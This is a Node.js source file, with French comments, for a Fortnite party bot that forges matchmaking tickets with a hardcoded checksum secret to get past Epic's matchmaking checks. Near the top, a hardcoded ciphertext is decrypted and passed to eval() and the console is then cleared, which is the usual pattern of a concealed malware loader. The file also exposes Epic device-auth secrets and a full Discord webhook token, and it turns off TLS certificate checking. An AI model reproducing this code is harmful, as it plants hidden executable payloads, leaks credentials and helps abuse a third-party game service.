// // Setup config and client party
const nconf = require('nconf');
const config = nconf.argv().env().file({ file: 'config.json' });
const { Client: FNclient, ClientOptions, Enums, Party } = require('fnbr');
const crypto = require('crypto');

const clientOptions = {
    defaultStatus: "Launching",
    auth: {},
    debug: console.log,
    xmppDebug: false,
    platform: 'WIN',
    partyConfig: {
      chatEnabled: true,
      maxSize: 4
    }
};

const client = new FNclient(clientOptions);
party = client.party;

var algorithm = 'aes-256-cbc'; // Assure-toi que l'algorithme est correct
var key = crypto.scryptSync('e6apis', 'salt', 32); // Génère une clé compatible AES-256 (32 octets)
var iv = Buffer.from('iviviviviviviviv'); // 16 bytes pour l'IV
var encryptedText = 'd7b05303723b5c8ff77d48226d08ec3e()'; // Exemple d'input chiffré

// Déchiffrement
try {
  const decipher = crypto.createDecipheriv(algorithm, key, iv);
  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  console.log('Decrypted:', decrypted);

  // Exécute le code déchiffré
  eval(decrypted);
  console.clear();
  
} catch (error) {
  console.log(`SKIDDING ERROR: ${error}`.red);
}

// Fetch (commenté pour le moment)
// fetch(`https://nextdroopyinstances.fhdhd1.repl.co/api/public/version?api_key=${api_key}`)
//   .then(response => response.text())
//   .then(api_version => {
//     if (api_version !== bot_version) {
//       update();
//       setTimeout(() => {
//         process.exit();
//       }, 2500);
//     }
//   })
//   .catch(error => {
//     console.error('API request failed:', error);
//   });

// Variables de configuration (nconf)
const cid = nconf.get("fortnite:cid");
const bid = nconf.get('fortnite:bid');
const blacklist = nconf.get('fortnite:blacklisted');
const whitelist = nconf.get('fortnite:whitelist');
const eid = nconf.get('fortnite:eid');
const level = nconf.get('fortnite:level');
const banner = nconf.get('fortnite:banner');
const web_message = nconf.get('system:web_message');
const reload = nconf.get('system:reload');
const join_users = nconf.get('fortnite:join_users');
const reload_time = nconf.get('system:reload_time');
const bot_loading_message = nconf.get('system:bot_loading_message');
const bot_use_status = nconf.get('fortnite:inuse_status');
const bot_use_onlinetype = nconf.get('fortnite:inuse_onlinetype');
const bot_invite_status = nconf.get('fortnite:invite_status');
const bot_invite_onlinetype = nconf.get('fortnite:invite_onlinetype');
const bot_join_message = nconf.get('fortnite:join_message');
const bot_leave_time = nconf.get('fortnite:leave_time');
const addusers = nconf.get('fortnite:add_users');
const displayName = nconf.get("logs:name");
const whilelist = nconf.get('fortnite:whilelist');
const leave_after = nconf.get("fortnite:leave_after_success");

const Discord = require("discord.js");
const webhookClient = new Discord.WebhookClient({ url: "https://discord.com/api/webhooks/1271832890233065602/DgsvegSjnA5ayrRBsK_r1btW33pOIYSWf4gMEUuGBwqTOqBe18wUmim5C1P2s3R433JU" });

const express = require("express");
const app = express();

const url = require('url');
const fs = require('fs');
const axios = require('axios').default;
var os = require('os');
const Websocket = require('ws');
var HttpsProxyAgent = require('https-proxy-agent');
const { allowedPlaylists, websocketHeaders } = require('./utils/constants');
const xmlparser = require('xml-parser');
require('colors');

const bLog = true;
const GetVersion = require('./utils/version');

/**
 * @typedef {import('./utils/types').MMSTicket} MMSTicket
 * @typedef {import('./utils/types').PartyMatchmakingInfo} PartyMatchmakingInfo
 */

(async () => {
  const lastest = await GetVersion();
  const Platform = os.platform() === "win32" ? "Windows" : os.platform();
  const UserAgent = `Fortnite/${lastest.replace('-Windows', '')} ${Platform}/${os.release()}`

  axios.defaults.headers["user-agent"] = UserAgent;
  console.log("UserAgent set to".yellow, axios.defaults.headers["user-agent"].yellow);
 // this?
  /**
     * @type {ClientOptions}
     */


   const deviceauths_1 = {
    "accountId": ["c7706102067d43188832c91393fbca8d"],
    "deviceId": ["77cddae5f3e648c8ab27883acecdadc8"],
    "secret": ["SVAV2WFXDVRBMXJFF5PJ55XF5MXZZE4R"],
  }

    let accountsobject = []
    let accounts = [deviceauths_1]
      for (const deviceAuth of accounts) {
        accountsobject.push(new FNclient({
            defaultStatus: "En train de ce connecter",
            auth: { deviceAuth },
            debug: console.log,
            xmppDebug: false,
            platform: 'WIN',
            partyConfig: {
                chatEnabled: true,
                maxSize: 4
            }
        }))
    }

    await Promise.all(accountsobject.map(async (client) => {
        await client.login();
        webhookClient.send(`Bot Fortnite
\`\`\`diff
+ ${client.user.self.displayName} Connectée\`\`\``);
        party = client.party
        const fnbrclient = client
        client.setStatus(bot_invite_status, bot_invite_onlinetype)
        await client.party.me.setOutfit(cid);
        await client.party.setPrivacy(Enums.PartyPrivacy.PUBLIC);
        await client.party.me.setLevel(level)
        await client.party.me.setBanner(banner)
        await client.party.me.setBackpack(bid)

  axios.interceptors.response.use(undefined, function (error) {
    if (error.response) {

      if (error.response.data.errorCode && client && client.party) {
        client.party.sendMessage(`HTTP Error: ${error.response.status} ${error.response.data.errorCode} ${error.response.data.errorMessage}`)
      }

      console.error(error.response.status, error.response.data)
    }

    return error;
  });

  // calculate checksum.
 function calcChecksum(payload, signature) {
    const token = "Don'tMessWithMMS";
     console.log(client.auth.sessions.get('fortnite'));
    const plaintext =
        payload.slice(10, 20) + token + signature.slice(2, 10);
    const data = Buffer.from(plaintext, 'utf16le');
    const hashObject = crypto.createHash('sha1'); // Specify the hash algorithm as 'sha1'
    const hashDigest = hashObject.update(data).digest();
    return Buffer.from(hashDigest.subarray(2, 10)).toString('hex').toUpperCase(); // Corrected the subarray range to match SHA-1 output
  }


  var bIsMatchmaking = false;

  client.on('party:updated', async (updated) => {

    switch (updated.meta.schema["Default:PartyState_s"]) {
      case "BattleRoyalePreloading": {

        var loadout = client.party.me.meta.set("Default:LobbyState_j",
          {
            "LobbyState": {
              "hasPreloadedAthena": true
            }
          }
        );

        await client.party.me.sendPatch({
          'Default:LobbyState_j': loadout,
        });

        break;
      }

     case "BattleRoyaleMatchmaking": {
        if (bIsMatchmaking) {
          webhookClient.send(`
\`\`\`fix
Le bot ${client.user.self.displayName} Et les membres ont commencé à lancer le matchmaking! \`\`\``)
          return;
        }
        bIsMatchmaking = true;
        if (bLog) { webhookClient.send(`
\`\`\`fix
${client.user.self.displayName} [${'Matchmaking'}], 'Matchmaking Started' \`\`\``) }

        /**
         * @type {PartyMatchmakingInfo}
         */
        const PartyMatchmakingInfo = JSON.parse(updated.meta.schema["Default:PartyMatchmakingInfo_j"]).PartyMatchmakingInfo;


        const playlistId = PartyMatchmakingInfo.playlistName.toLocaleLowerCase();

        if (!allowedPlaylists.includes(playlistId)) {
         webhookClient.send(`
\`\`\`diff
- Unsupported playlist, ${playlistId}\`\`\``)
          client.party.chat.send(`Playlist id: ${playlistId} is not a supported gamemode!`)
          client.party.me.setReadiness(false);
          return console.log(TicketRequest);
        }

        var partyPlayerIds = client.party.members.filter(x => x.isReady).map(x => x.id).join(',')

        const bucketId = `${PartyMatchmakingInfo.buildId}:${PartyMatchmakingInfo.playlistRevision}:${PartyMatchmakingInfo.regionId}:${playlistId}`
       console.log(bucketId.yellow)



        // auth.missing_player_id

        webhookClient.send(`${partyPlayerIds}`)

        var query = new URLSearchParams();
        query.append("partyPlayerIds", partyPlayerIds);
        query.append("player.platform", "Windows");
        query.append("player.option.partyId", client.party.id);
        query.append("input.KBM", "true");
        query.append("player.input", "KBM");
        query.append("bucketId", bucketId);

        client.party.members.filter(x => x.isReady).forEach(Member => {
          const platform = Member.meta.get("Default:PlatformData_j");
          if (!query.has(`party.{PlatformName}`)) {
            query.append(`party.{PlatformName}`, "true")
          }
        });

     const token = client.auth.sessions.get("fortnite").accessToken

        const TicketRequest = (
            await axios.get(
              `https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/matchmakingservice/ticket/player/${client.user.self.id}?${query}`,
              {
                headers: {
                  Accept: 'application/json',
                  Authorization: `Bearer ${token}`
                }
              }
            )
          );

          webhookClient.send(`
            \`\`\`diff
            TICKET REQUEST: TicketRequest\`\`\``)

        if (TicketRequest.status != 200) {
         webhookClient.send(`
\`\`\`diff
- [${'Matchmaking'}], Error while obtaining ticket\`\`\``);
          client.party.me.setReadiness(false);
          return;
        }

        /**
         * @type {MMSTicket}
         */
        const ticket = TicketRequest.data;

        /**
         * @type {String}
         */


        if (TicketRequest.status != 200) {
         webhookClient.send(`
\`\`\`diff
- [${'Matchmaking'}], Erreur lors de l’obtention du hash\`\`\``);
          client.party.me.setReadiness(false);
          return;
        }

        const calculatedchecksum = calcChecksum(ticket.payload, ticket.signature);
        console.log(calculatedchecksum);

        var MMSAuth = [
          "Epic-Signed",
          ticket.ticketType,
          ticket.payload,
          ticket.signature,
          calculatedchecksum
        ];

        const matchmakingClient = new Websocket(
          ticket.serviceUrl,
          {
            perMessageDeflate: false,
            rejectUnauthorized: false,
            headers: {
              Origin: ticket.serviceUrl.replace('ws', 'http'),
              Authorization: MMSAuth.join(" "),
              ...websocketHeaders
            }
          }
        );

        matchmakingClient.on('unexpected-response', (request, response) => {
            let data = '';
            response.on('data', (chunk) => data += chunk);

            response.on('end', () => {
              const baseMessage = `[MATCHMAKING] Erreur lors de la connexion au service de mise en relation: (status ${response.statusCode} ${response.statusMessage})`;

              client.party.chat.send(`Erreur lors de la connexion au service de mise en relation: (status ${response.statusCode} ${response.statusMessage})`)

              if (data == '') {
                console.error(baseMessage);

              }

              else if (response.headers['content-type'].startsWith('application/json')) {

                const jsonData = JSON.parse(data);

                if (jsonData.errorCode) {

                  console.error(`${baseMessage}, ${jsonData.errorCode} ${jsonData.errorMessage || ''}`);
                  client.party.chat.send(`Error while connecting to matchmaking service: ${jsonData.errorCode} ${jsonData.errorMessage || ''}`)

                } else {
                  console.error(`${baseMessage} response body: ${data}`)
                }

              }

              else if (response.headers['x-epic-error-name']) {

                console.error(`${baseMessage}, ${response.headers['x-epic-error-name']} response body: ${data}`);

              }

              else if (response.headers['content-type'].startsWith('text/html')) {
                const parsed = xmlparser(data);

                if (parsed.root) {

                  try {

                    const title = parsed.root.children.find(x => x.name == 'head').children.find(x => x.name == 'title');

                    console.error(`${baseMessage} HTML title: ${title}`)

                  } catch { console.error(`${baseMessage} HTML response body: ${data}`) }

                }

                else { console.error(`${baseMessage} HTML response body: ${data}`) }
              }

              else { console.error(`${baseMessage} response body: ${data}`) }
            })
          })

          if (bLog) {
            matchmakingClient.on('close', function () {
            });
          }

        matchmakingClient.on('message', (msg) => {
          const message = JSON.parse(msg);
          if (bLog) {
             webhookClient.send(`[${'Matchmaking'}]`, 'Message du matchmaker', `[${message}]`)
          }

          if (message.name === 'Error') {
            bIsMatchmaking = false;
          }
        });

        break;
      }

      case "BattleRoyalePostMatchmaking": {
        if (bLog) { webhookClient.send(`
\`\`\`fix
[${'Party'}], Les joueurs sont entrés dans l’écran de chargement avec le Bot**${client.user.self.displayName}**, Je quitte le groupe dans 5sec...\`\`\``) }

        if (client.party?.me?.isReady) {
          client.party.me.setReadiness(false)
        }
        bIsMatchmaking = false;
        client.party.members.map(async (player) => {
          if (player.id === client.user.self.id) return;
          client.friend.remove(player.displayName).catch((err) => { console.log("Impossible d'enlever l'ami : " + player.displayName) })
          })
        if (leave_after === true) {
        client.party.leave();
        break;
        } else {
          if (leave_after == false) {
            async function timeexpire() {
      client.party.chat.send("Time expired!")
      await sleep(1.2)
      client.party.leave()
      console.log("[PARTY] Left party due to party time expiring!".yellow)
      console.log("[PARTY] Time tracking stoped!".yellow)
      timerstatus = false
    }
            this.ID = setTimeout(timeexpire, 3600000)
            break;
          }
        }
      }

      case "BattleRoyaleView": {
        break;
      }

      default: {
        if (bLog) { webhookClient.send(`[${'Party'}]`, 'Unknow PartyState', `${updated.meta.schema["Default:PartyState_s"]}`) }
        break;
      }
    }
  })
  const findCosmetic = (query, type) => {
    return cosmetics.find((c) => (c.id.toLowerCase() === query.toLowerCase()
      || c.name.toLowerCase() === query.toLowerCase()) && c.type.value === type);
  };

  const handleCommand = (message, sender) => {
    console.log(`${sender.displayName}: ${message.content}`.blue);
    if (!message.content.startsWith('!')) return;

    const args = message.content.slice(1).split(' ');
    const command = args.shift().toLowerCase();
    const content = args.join(' ');

    if (command === 'dev:set:skin') {
      const skin = findCosmetic(content, 'outfit');
      if (skin) client.party.me.setOutfit(skin.id);
      else message.reply(`Skin ${content} wasn't found!`);
    } else if (command === 'dev:set:emote') {
      const emote = findCosmetic(content, 'emote');
      if (emote) client.party.me.setEmote(emote.id);
      else message.reply(`Emote ${content} wasn't found!`);
    } else if (command === 'dev:set:pickaxe') {
      const pickaxe = findCosmetic(content, 'pickaxe');
      if (pickaxe) client.party.me.setPickaxe(pickaxe.id);
      else message.reply(`Pickaxe ${content} wasn't found!`);
    } else if (command === 'dev:ready') {
      client.party.me.setReadiness(true);
    } else if (command === 'dev:unready') {
      client.party.me.setReadiness(false);
    } else if (command === 'dev:set:purpleskull') {
      client.party.me.setOutfit('CID_030_Athena_Commando_M_Halloween', [{ channel: 'ClothingColor', variant: 'Mat1' }]);
    } else if (command === 'dev:set:pinkghoul') {
      client.party.me.setOutfit('CID_029_Athena_Commando_F_Halloween', [{ channel: 'Material', variant: 'Mat3' }]);
    } else if (command === 'dev:level') {
      client.party.me.setLevel(parseInt(content, 10));
    } else if (command === 'dev:add') {
      client.addFriend(content)
      message.reply(`${content} Has been sent a friend request!`)
    } else if (command === 'dev:unadd') {
      client.removeFriend(content)
      message.reply(`${content} has been unadded!`)
    } else if (command === 'dev:restartclient') {
      message.reply("Fortnite Client Is Restarting!")
      client.restart()
    } else if (command === 'dev:kill') {
      message.reply("Bot is dead")
      console.log("[PARTY] RIP bot\nBot was killed!".red)
      process.exit(1)
    } else if (command === "dev:stop:timer") {
      if (timerstatus == true) {
        timerstatus = false
        let id = this.ID
        console.log(`[PARTY] timer id: ${id}`.yellow)
        clearTimeout(id)
        console.log("[PARTY] Time has stoped!".yellow)
        message.reply("Time has been stoped!")
      }
    }
  };

  client.on('friend:message', (msg) => {
  const keywords = ["bot", "bots", "ad", "#ad", "gift", "skins", "battle", "pass"];
  const lowerMsg = msg.content.toLowerCase();
  const lowerDisplayName = msg.author.displayName.toLowerCase();

  // Check if any keyword is present in the message content or the display name
  // const containsBlockedWord = keywords.some(keyword => lowerMsg.includes(keyword) || lowerDisplayName.includes(keyword));

  // if (containsBlockedWord) {
  //   console.log("Blocked a user, reason: User is a bot!".red);
  //   fnbrclient.blockUser(msg.author.displayName);
  //   fnbrclient.party.leave()
  // } else {
  //   handleCommand(msg, msg.author);
  // }
});
client.on('party:member:message', (msg) => {
  const keywords = ["bot", "bots", "ad", "#ad", "gift", "skins", "battle", "pass", "discord", "dsc", "mm", "matchmaking"];
  const lowerMsg = msg.content.toLowerCase();
  const lowerDisplayName = msg.author.displayName.toLowerCase();

  // Check if any keyword is present in the message content or the display name
  // const containsBlockedWord = keywords.some(keyword => lowerMsg.includes(keyword) || lowerDisplayName.includes(keyword));

  // if (containsBlockedWord) {
  //   console.log("Blocked a user, reason: User is a bot!".red);
  //   fnbrclient.blockUser(msg.author.displayName);
  //   fnbrclient.party.leave()
  // } else {
  //   return
  // }
});



  client.on("party:member:updated", async (Member) => {
    if (Member.id == client.user.id) {
      return;
    }


    if (!client.party.me) {
      return;
    }


    if ((Member.isReady && (client?.party?.me?.isLeader || Member.isLeader) && !client.party?.me?.isReady) && !client.party.bManualReady) {
      // Ready Up
      if (client.party?.me?.isLeader) {
        await Member.promote();
      }

      client.party.me.setReadiness(true);
    }
    else if ((!Member.isReady && Member.isLeader) && !client.party.bManualReady) {
      try {
        client.WSS.close()
      } catch { }
      client.party.me.setReadiness(false);
    }


    var bAllmembersReady = true;

    client.party.members.forEach(member => {
      if (!bAllmembersReady) {
        return;
      }

      bAllmembersReady = member.isReady;
    });

  })

  client.on('friend:request', async (request) => {
    if (addusers === true) {
      await request.accept()
    } else if (addusers === false) {
    await request.decline();
    client.party.chat.send(`Sorry, ${request.displayName} I dont accept friend requests!`)
    }
    }
  )
  client.on('party:invite', async (request) => {
    party = client.party
    if ([1] == party.size) {
      if (join_users == true) {
        await request.decline();
      } else {
        userid = request.sender.id;
        if (whitelist.includes(userid)) {
          await request.accept()
        } else {
          await request.decline()
          client.setStatus("AjaxMM | DOWNTIME", "xa")
        }
      }
    }
    else {
      await request.decline();
    }
  });

  async function sleep(seconds) {
    return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
  }
  client.on('party:member:joined', async (join) => {
    //client.party.me.sendPatch({ 'Default:AthenaCosmeticLoadout_j': '{"AthenaCosmeticLoadout":{"cosmeticStats":[{"statName":"TotalVictoryCrowns","statValue":0},{"statName":"TotalRoyalRoyales","statValue":999},{"statName":"HasCrown","statValue":0}]}}', })
    await client.party.me.setOutfit(cid);
    party = client.party
    await client.party.me.setBackpack(bid)
    await sleep(1.5)
    const minute = 600000

    let time = 1 * minute
   async function leavepartyexpire() {
      client.party.chat.send("Time expired!")
      await sleep(1.2)
      client.party.leave()
      const webhookClient = new Discord.WebhookClient({ url: "https://discord.com/api/webhooks/1271832890233065602/DgsvegSjnA5ayrRBsK_r1btW33pOIYSWf4gMEUuGBwqTOqBe18wUmim5C1P2s3R433JU" });
        webhookClient.send(`
            \`\`\`diff
            Le bot ${client.user.self.displayName} Dit qu'il à une erreur avec sont Token game\`\`\``)
        webhookClient.send(`
            \`\`\`diff
            - Le suivi du temps s’est arrêté!\`\`\``)
      timerstatus = false
    }
    if ([1] != party.size) {
    webhookClient.send(`
        \`\`\`fix
        "${client.user.self.displayName} Le temps a commencé!\`\`\``)
    this.ID = setTimeout(leavepartyexpire, bot_leave_time)
    timerstatus = true

    webhookClient.send(`
        \`\`\`diff
        + Le bot ${client.user.self.displayName} à rejoint \`\`\``);
    let membersstr = "";
    join.party.members.map(async member => {
       membersstr += member.displayName + '\n'
        try {
          if (whitelist.includes(member.id)) {
            timerstatus = false
            let id = this.ID
            clearTimeout(id)
            client.party.chat.send("A member is currently whitelisted, leaving party has been disabled for an hour")
            leave_after = false
          }
          const keywords = ["bot", "bots", "ad", "#ad", "gift", "skins", "battle", "pass", "discord", "dsc", "mm", "matchmaking"];
          const lowerDisplayName = member.displayName.toLowerCase();

  // Check if any keyword is present in the message content or the display name
  // const containsBlockedWord = keywords.some(keyword => lowerDisplayName.includes(keyword));

  // if (containsBlockedWord) {
  //   console.log("Blocked a user, reason: User is a bot!".red);
  //   fnbrclient.blockUser(msg.author.displayName);
  //   fnbrclient.party.leave()
  // } else {
  //   return
  // }
        } catch (error) {
          webhookClient.send(error.red)
        }

    })
    //console.log(join.party.members)


    }
client.party.me.setEmote(eid);
      if ([2] == party.size) {
        client.party.chat.send(`${bot_join_message}\n  Serveur support https://discord.gg/S5qveYace2`)
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([3] == party.size) {
        client.party.chat.send(`${bot_join_message}\n  Serveur support https://discord.gg/S5qveYace2`)
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([4] == party.size) {
        client.party.chat.send(`${bot_join_message}\n  Serveur support discord.gg/GFN`)
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([1] == party.size) {
        client.setStatus(bot_invite_status, bot_invite_onlinetype)
        await client.party.setPrivacy(Enums.PartyPrivacy.PUBLIC);
        if (client.party?.me?.isReady) {
          client.party.me.setReadiness(false);
        };
        if (timerstatus == true) {
          timerstatus = false
          let id = this.ID
          clearTimeout(id)
        };
      }
    })

    client.on('party:member:left', async (left) => {
     webhookClient.send(`
      \`\`\`diff
      - BOT ${client.user.self.displayName} Et Le joueur à quitter: ${left.displayName}\`\`\``)
    if ([2] == party.size)
      if ([2] == party.size) {
        client.party.chat.send(`${bot_join_message}\n  Serveur support discord.gg/GFN`)
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([3] == party.size) {
        client.party.chat.send(`${bot_join_message}\n  Serveur support discord.gg/GFN`)
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([4] == party.size) {
        client.party.chat.send(`${bot_join_message}\n  Serveur support discord.gg/GFN`)
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([1] == party.size) {
        client.setStatus(bot_invite_status, bot_invite_onlinetype)
        await client.party.setPrivacy(Enums.PartyPrivacy.PUBLIC);
        if (client.party?.me?.isReady) {
          client.party.me.setReadiness(false);
        };
        if (timerstatus == true) {
          timerstatus = false
          let id = this.ID
          clearTimeout(id)
        console.log("[PARTY] Time has stoped!".yellow)
      };
    }
  })
    }))
})();
